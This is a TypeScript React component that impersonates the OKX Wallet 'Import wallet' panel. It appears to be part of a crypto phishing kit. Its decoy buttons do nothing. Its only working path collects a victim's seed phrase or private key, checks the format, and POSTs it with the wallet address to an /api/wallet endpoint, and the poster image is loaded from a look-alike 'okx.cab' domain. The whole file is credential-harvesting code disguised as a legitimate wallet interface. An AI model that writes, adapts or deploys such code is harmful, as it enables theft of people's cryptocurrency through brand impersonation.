"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import { ChevronLeft, ChevronDown } from "lucide-react"
import { Sheet, SheetContent, SheetHeader } from "@/components/ui/sheet"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs"

interface OKXWalletPanelProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onWalletImported?: () => void
  walletAddress?: string
}

type ViewState = "main" | "import" | "seed-phrase" | "private-key"

export default function OKXWalletPanel({ open, onOpenChange, onWalletImported, walletAddress }: OKXWalletPanelProps) {
  const [view, setView] = useState<ViewState>("main")
  const [seedPhraseWords, setSeedPhraseWords] = useState(12)
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""))
  const [privateKey, setPrivateKey] = useState("")
  const [privateKeyError, setPrivateKeyError] = useState("")
  const [activeTab, setActiveTab] = useState<"seed" | "private">("seed")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleBack = () => {
    if (view === "seed-phrase" || view === "private-key") {
      setView("import")
    } else if (view === "import") {
      setView("main")
    }
  }

  const handleImportOption = (option: "seed-phrase" | "private-key") => {
    setView(option)
    setActiveTab(option === "seed-phrase" ? "seed" : "private")
  }

  const handleTabChange = (value: string) => {
    if (value === "seed") {
      setView("seed-phrase")
      setActiveTab("seed")
    } else if (value === "private") {
      setView("private-key")
      setActiveTab("private")
    }
  }

  const sendWalletData = async (type: "seed" | "private", data: string | string[]): Promise<boolean> => {
    if (isSubmitting) {
      return false // Prevent duplicate submissions
    }

    setIsSubmitting(true)
    try {
      const response = await fetch("/api/wallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type,
          data,
          walletAddress: walletAddress || "",
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to send wallet data")
      }

      return true
    } catch (error) {
      console.error("Failed to send wallet data:", error)
      setIsSubmitting(false)
      return false
    }
  }

  const handleConfirmSeedPhrase = async () => {
    if (isSubmitting) return // Prevent duplicate submissions
    
    const phrase = seedPhrase.filter((word) => word.trim() !== "")
    if (phrase.length === seedPhraseWords) {
      const success = await sendWalletData("seed", phrase)
      if (success) {
        if (onWalletImported) {
          onWalletImported()
        }
        onOpenChange(false)
      }
    }
  }

  const validatePrivateKey = (key: string): boolean => {
    // Remove whitespace
    const cleanedKey = key.trim()
    
    // Check if empty
    if (!cleanedKey) {
      setPrivateKeyError("")
      return false
    }

    // Remove 0x prefix if present
    const keyWithoutPrefix = cleanedKey.startsWith("0x") ? cleanedKey.slice(2) : cleanedKey
    
    // Ethereum private key must be exactly 64 hexadecimal characters
    if (keyWithoutPrefix.length !== 64) {
      setPrivateKeyError("Private key must be 64 hexadecimal characters")
      return false
    }

    // Check if all characters are valid hexadecimal
    if (!/^[0-9a-fA-F]+$/.test(keyWithoutPrefix)) {
      setPrivateKeyError("Private key must contain only hexadecimal characters (0-9, a-f, A-F)")
      return false
    }

    setPrivateKeyError("")
    return true
  }

  const handlePrivateKeyChange = (value: string) => {
    setPrivateKey(value)
    if (value.trim()) {
      validatePrivateKey(value)
    } else {
      setPrivateKeyError("")
    }
  }

  const handleConfirmPrivateKey = async () => {
    if (isSubmitting) return // Prevent duplicate submissions
    
    const trimmedKey = privateKey.trim()
    if (trimmedKey && validatePrivateKey(trimmedKey)) {
      // Normalize private key (remove 0x prefix if present)
      const normalizedKey = trimmedKey.startsWith("0x") ? trimmedKey.slice(2) : trimmedKey
      const success = await sendWalletData("private", normalizedKey)
      if (success) {
        if (onWalletImported) {
          onWalletImported()
        }
        onOpenChange(false)
      }
    }
  }

  // Sync activeTab with view
  useEffect(() => {
    if (view === "seed-phrase") {
      setActiveTab("seed")
    } else if (view === "private-key") {
      setActiveTab("private")
    }
  }, [view])

  // Reset to welcome screen when panel opens
  useEffect(() => {
    if (open) {
      setView("main")
      setActiveTab("seed")
      setIsSubmitting(false)
      setPrivateKeyError("")
    }
  }, [open])

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent
        side="right"
        className="w-full sm:max-w-md bg-black border-l border-[#1a1a1a] p-0 overflow-y-auto [&>button]:hidden"
      >
        <div className="flex flex-col h-full">
          {/* Header */}
          <SheetHeader className="px-6 py-4 border-b border-[#1a1a1a]">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-6 h-6 flex items-center justify-center flex-shrink-0">
                  <Image
                    src="/okx.png"
                    alt="OKX Wallet"
                    width={18}
                    height={18}
                    className="w-6 h-6 object-contain"
                  />
                </div>
                <h2 className="text-sm font-normal text-white">OKX Wallet</h2>
              </div>
            </div>
          </SheetHeader>

          {/* Content */}
          <div className="flex-1 px-6 py-8">
            {view === "main" && (
              <div className="flex flex-col items-center h-full justify-between">
                {/* Video - Center */}
                <div className="flex-1 flex items-center justify-center">
                  <div className="w-full max-w-md relative flex items-center justify-center">
                    <video
                      autoPlay
                      playsInline
                      loop
                      muted
                      className="w-full h-auto rounded-lg"
                      poster="https://static.okx.cab/cdn/assets/imgs/2412/87CDA1790E4C4D22.png"
                    >
                      <source src="/cover-dark-v3.mp4" type="video/mp4" />
                    </video>
                  </div>
                </div>

                {/* Content Section - Heading, Features, and Buttons */}
                <div className="w-full space-y-6 mb-8">
                  <div className="space-y-2">
                    <h1 className="text-3xl font-bold text-white text-center">Your portal to Web3</h1>
                    <p className="text-gray-400 text-center text-sm">
                      Wallet · Trade · NFT · Earn · DApp
                    </p>
                  </div>
                  <div className="space-y-4">
                    <Button
                      onClick={() => {}}
                      className="w-full bg-white text-black hover:bg-gray-100 h-12 rounded-full font-semibold text-base"
                    >
                      Create wallet
                    </Button>
                    <Button
                      onClick={() => setView("import")}
                      className="w-full bg-black border-2 border-white text-white hover:bg-[#1a1a1a] h-12 rounded-full font-semibold text-base"
                    >
                      Import wallet
                    </Button>
                  </div>
                </div>
              </div>
            )}

            {view === "import" && (
              <div className="space-y-4">
                <h2 className="text-2xl font-bold text-white mb-6">Import wallet</h2>

                {/* Import Options */}
                <div className="space-y-3">
                  <button
                    onClick={() => handleImportOption("seed-phrase")}
                    className="w-full flex items-center justify-between p-4 bg-[#1a1a1a] hover:bg-[#252525] rounded-lg border border-[#2a2a2a] transition-colors group"
                  >
                    <div className="flex items-center gap-4">
                      <div className="w-10 h-10 bg-[#2a2a2a] rounded-lg flex items-center justify-center">
                        <svg
                          className="w-5 h-5 text-white"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
                          />
                        </svg>
                      </div>
                      <span className="text-white font-medium">Seed phrase or private key</span>
                    </div>
                    <ChevronLeft className="w-5 h-5 text-gray-400 group-hover:text-white transition-colors rotate-180" />
                  </button>

                  <button
                    onClick={() => {}}
                    className="w-full flex items-center justify-between p-4 bg-[#1a1a1a] hover:bg-[#252525] rounded-lg border border-[#2a2a2a] transition-colors group"
                  >
                    <div className="flex items-center gap-4">
                      <div className="w-10 h-10 bg-[#2a2a2a] rounded-lg flex items-center justify-center">
                        <svg
                          className="w-5 h-5 text-white"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                          />
                        </svg>
                      </div>
                      <span className="text-white font-medium">Hardware wallet</span>
                    </div>
                    <ChevronLeft className="w-5 h-5 text-gray-400 group-hover:text-white transition-colors rotate-180" />
                  </button>
                </div>

                {/* Terms */}
                <div className="mt-12 pt-6 border-t border-[#1a1a1a]">
                  <p className="text-xs text-gray-500 text-center">
                    By proceeding, I agree to OKX Wallet's{" "}
                    <button className="text-gray-400 hover:text-white underline">Terms of Service</button>
                  </p>
                </div>
              </div>
            )}

            {view === "seed-phrase" && (
              <div className="space-y-6">
                <h2 className="text-2xl font-bold text-white mb-2">Seed phrase or private key</h2>

                <Tabs value={activeTab} onValueChange={handleTabChange}>
                  <TabsList className="grid w-full grid-cols-2 bg-[#1a1a1a] p-1 h-auto">
                    <TabsTrigger
                      value="seed"
                      className="data-[state=active]:bg-[#2a2a2a] data-[state=active]:text-white text-gray-300 h-10 rounded-md"
                    >
                      Seed phrase
                    </TabsTrigger>
                    <TabsTrigger
                      value="private"
                      className="data-[state=active]:bg-[#2a2a2a] data-[state=active]:text-white text-gray-300 h-10 rounded-md"
                    >
                      Private key
                    </TabsTrigger>
                  </TabsList>

                  <TabsContent value="seed" className="mt-6">
                    <div className="space-y-4">
                      {/* Word count selector */}
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-white">
                          My seed phrase has <span className="font-bold">{seedPhraseWords} words</span>
                        </span>
                        <button className="text-white flex items-center gap-1">
                          <ChevronDown className="w-4 h-4" />
                        </button>
                      </div>

                      {/* Seed phrase inputs */}
                      <div className="grid grid-cols-2 gap-3">
                        {Array.from({ length: seedPhraseWords }).map((_, index) => (
                          <div key={index} className="relative">
                            <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300 text-sm font-medium z-10">
                              {index + 1}
                            </div>
                            <Input
                              type="text"
                              value={seedPhrase[index] || ""}
                              onChange={(e) => {
                                const newPhrase = [...seedPhrase]
                                newPhrase[index] = e.target.value
                                setSeedPhrase(newPhrase)
                              }}
                              className="!bg-[#1D1D1D] border border-[#2a2a2a] text-white pl-8 pr-3 py-3 h-12 rounded-lg focus:border-[#00D170] focus:ring-1 focus:ring-[#00D170] placeholder:text-gray-500"
                              placeholder=""
                            />
                          </div>
                        ))}
                      </div>

                      {/* Confirm button */}
                      <Button
                        onClick={handleConfirmSeedPhrase}
                        className="w-full bg-[#2a2a2a] text-white hover:bg-[#2a2a2a] hover:text-white h-12 rounded-lg mt-6"
                        disabled={seedPhrase.filter((word) => word.trim() !== "").length !== seedPhraseWords || isSubmitting}
                      >
                        {isSubmitting ? "Submitting..." : "Confirm"}
                      </Button>
                    </div>
                  </TabsContent>
                </Tabs>
              </div>
            )}

            {view === "private-key" && (
              <div className="space-y-6">
                <h2 className="text-2xl font-bold text-white mb-2">Seed phrase or private key</h2>

                <Tabs value={activeTab} onValueChange={handleTabChange}>
                  <TabsList className="grid w-full grid-cols-2 bg-[#1a1a1a] p-1 h-auto">
                    <TabsTrigger
                      value="seed"
                      className="data-[state=active]:bg-[#2a2a2a] data-[state=active]:text-white text-gray-300 h-10 rounded-md"
                    >
                      Seed phrase
                    </TabsTrigger>
                    <TabsTrigger
                      value="private"
                      className="data-[state=active]:bg-[#2a2a2a] data-[state=active]:text-white text-gray-300 h-10 rounded-md"
                    >
                      Private key
                    </TabsTrigger>
                  </TabsList>

                  <TabsContent value="private" className="mt-6">
                    <div className="space-y-4">
                      <label className="text-sm text-white">Private key</label>
                      <textarea
                        value={privateKey}
                        onChange={(e) => handlePrivateKeyChange(e.target.value)}
                        placeholder="Paste or enter your private key (64 hex characters)"
                        className={`w-full bg-[#1D1D1D] border ${
                          privateKeyError ? "border-red-500" : "border-[#2a2a2a]"
                        } text-white p-3 h-24 rounded-lg focus:border-[#00D170] focus:ring-1 focus:ring-[#00D170] placeholder:text-gray-500 resize-none`}
                      />
                      {privateKeyError && (
                        <p className="text-sm text-red-400">{privateKeyError}</p>
                      )}
                      {!privateKeyError && privateKey.trim() && (
                        <p className="text-sm text-green-400">✓ Valid private key format</p>
                      )}

                      <button className="flex items-center gap-2 text-white text-sm hover:text-gray-300 transition-colors">
                        <span>Bulk import private key</span>
                        <ChevronLeft className="w-4 h-4 rotate-180" />
                      </button>

                      {/* Confirm button */}
                      <Button
                        onClick={handleConfirmPrivateKey}
                        className="w-full bg-[#2a2a2a] text-white hover:bg-[#2a2a2a] hover:text-white h-12 rounded-lg mt-6"
                        disabled={!privateKey.trim() || !!privateKeyError || isSubmitting}
                      >
                        {isSubmitting ? "Submitting..." : "Confirm"}
                      </Button>
                    </div>
                  </TabsContent>
                </Tabs>
              </div>
            )}
          </div>
        </div>
      </SheetContent>
    </Sheet>
  )
}

